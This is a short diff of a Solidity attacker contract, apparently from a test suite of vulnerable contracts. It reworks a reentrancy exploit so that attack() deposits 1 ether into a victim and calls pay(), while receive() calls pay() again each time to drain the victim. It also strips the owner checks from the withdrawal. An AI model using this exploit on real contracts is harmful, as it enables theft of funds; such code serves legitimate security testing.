@@ -62,37 +62,21 @@ contract LowLevelCallToTarget_Attacker2 {
 
 contract LowLevelCallToTarget_Attacker3 {
     // LowLevelCallToTarget_Attacker3: sets victim address after deployment
-    ILowLevelCallToTarget public c;
-    address public owner;
 
-    constructor() {
-        owner = msg.sender;
-    }
-
-    function setVictim(address _c) public {
-        require(msg.sender == owner, "Only owner can set victim");
-        c = ILowLevelCallToTarget(_c);
-    }
-
-    function getVictim() public view returns (address) {
-        return address(c);
-    }
-
-    function attack() external payable {
+    function attack(address _victim) external payable {
         require(msg.value >= 1 ether, "Need at least 1 ether to attack");
-        c.deposit{value: 1 ether}();
-        c.pay();
+        ILowLevelCallToTarget(_victim).deposit{value: 1 ether}();
+        ILowLevelCallToTarget(_victim).pay();
     }
 
     function collectEther() public {
-        require(msg.sender == owner, "Only owner can collect Ether");
-        payable(owner).transfer(address(this).balance);
+        payable(msg.sender).transfer(address(this).balance);
     }
 
     // Allow contract to receive Ether
     receive() external payable {
-        if (address(c).balance >= 1 ether) {
-            c.pay();
+        if (msg.sender.balance >= 1 ether) {
+            ILowLevelCallToTarget(msg.sender).pay();
         }
     }
 }
